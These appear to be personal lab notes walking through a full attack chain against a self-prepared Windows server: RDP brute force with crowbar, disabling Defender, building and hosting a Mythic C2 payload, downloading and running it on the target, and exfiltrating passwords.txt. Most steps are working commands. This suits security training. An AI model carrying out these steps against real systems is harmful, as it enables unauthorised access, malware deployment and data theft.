
### 1. Introduction

Goal: Perform an RDP brute force attack using Kali Linux, generate a Mythic C2 agent and host it, establish a C2 session from a compromised Windows server and exfiltrate a sensitive file to complete the attack chain.

---

### 2. Objective

- Launch a brute force attack on a Windows server.
- Run discovery and defense evasion commands.
- Build and host a Mythic payload.
- Download and execute the payload on the Windows target.
- Establish a C2 session and exfiltrate the `passwords.txt` file.

---

### 3. Preparing the Windows Server

1. **Create Fake Password File**
    - Navigate to `Documents` and create a file named `passwords.txt`.
        ![[Pasted image 20251018160503.png]]

2. **Change Windows Password**
    
    - Go to:  
        `Start Menu` → Username → `Change Account Settings` → `Sign-in Options` → Password → `Change`
        
    - Set the new password to `Winter2024!`.
        
3. **Adjust Password Policy (if required)**
    
    - Minimum password length: **5 characters**
        
    - Disable complexity requirements in _Local Group Policy Editor_.
        

---

### 4. Performing RDP Brute Force Attack

1. **Prepare Wordlist**
    
    - Navigate to Kali Linux terminal:
        
        `cd /usr/share/wordlists sudo gunzip rockyou.txt.gz head -n50 rockyou.txt > ~/Desktop/Challenge-Wordlist.txt echo "Winter2024!" >> ~/Desktop/Challenge-Wordlist.txt`
        
2. **Install Crowbar**
    
    `sudo apt-get update && sudo apt-get upgrade -y sudo apt-get install -y crowbar`
    
3. **Create Target File**
    
    - Add Windows Server IP and username.
        
4. **Run Brute Force Attack**
    
    `crowbar -b rdp -u Administrator -C Challenge-Wordlist.txt -s <Challenge-WIN-Haji-IP>/32`
    
5. **Successful Login**
    
    - Username: `Administrator`
        
    - Password: `Winter2024!`
        

---

### 5. Connecting to the Windows Server

1. **Establish RDP Session**
    
    `xfreerdp /u:Administrator /p:Winter2024! /v:<Challenge-WIN-Haji-IP>:3389`
    
2. **Trust the certificate** to complete the connection.
    

---

### 6. Discovery Phase

Run basic discovery commands in PowerShell or CMD:

`whoami ipconfig net user net group net user Administrator`

---

### 7. Defense Evasion

Disable Windows Defender:

- Open **Windows Security** → **Virus & Threat Protection**.
    
- Disable Real-time protection and other security features.
    

---

### 8. Execution Phase (Mythic Agent Setup)

1. **Access Mythic Server**
    
    `ssh root@<Challenge-Mythic-IP>`
    
2. **Install Apollo Agent**
    
    `./mythic-cli install github https://github.com/MythicAgents/Apollo`
    
3. **Install HTTP C2 Profile**
    
    `./mythic-cli install github https://github.com/MythicC2Profiles/http`
    
4. **Create Payload in Mythic Web GUI**
    
    - Target OS: **Windows**
        
    - Output Format: **WinExe**
        
    - Commands: **Include All**
        
    - C2 Profile: **HTTP**
        
    - Callback Host: `http://<Challenge-Mythic-IP>`
        
    - Port: `80`
        
    - Payload Name: `ChallengeMythicPayload`
        

---

### 9. Hosting and Downloading Payload

1. **Download Payload**
    
    `wget <payload_download_link> --no-check-certificate mv <payload_name>.exe servicehost-haji.exe`
    
2. **Serve Payload over HTTP**
    
    `ufw allow 9999 python3 -m http.server 9999`
    
3. **Download on Windows Target**
    
    `Invoke-WebRequest -Uri http://<Challenge-Mythic-IP>:9999/servicehost-haji.exe -OutFile C:\Users\Public\Downloads\servicehost-haji.exe`
    
4. **Allow Port 80**
    
    `ufw allow 80`
    
5. **Execute Payload**
    
    `.\servicehost-haji.exe`
    
6. **Verify Connection**
    
    `netstat -anob`
    
    - Also check Task Manager or Mythic GUI callbacks.
        

---

### 10. Establishing C2 Connection

- Open Mythic Web GUI → **Active Callbacks**.
- Interact with the agent and run:
    
    `whoami ipconfig`
    

---

### 11. Exfiltration

1. **Download the Target File**
    
    `download C:\Users\Administrator\Documents\passwords.txt`
    
2. **Verify in Mythic Web GUI**
    
    - Navigate to **Files** → Check `passwords.txt` contents.
        


**Reference**
https://youtu.be/85x0NLj2zUo?si=_cpuOgH-OqAYwgYo